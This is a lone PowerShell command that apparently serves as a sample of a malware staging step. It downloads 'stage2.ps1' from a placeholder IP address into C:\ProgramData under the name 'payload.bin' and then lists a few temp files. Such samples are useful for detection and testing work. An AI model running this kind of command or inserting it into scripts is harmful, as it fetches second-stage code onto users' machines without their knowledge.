(New-Object System.Net.WebClient).DownloadFile("http://192.0.2.215:80/stage2.ps1", "C:\ProgramData\payload.bin"); Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
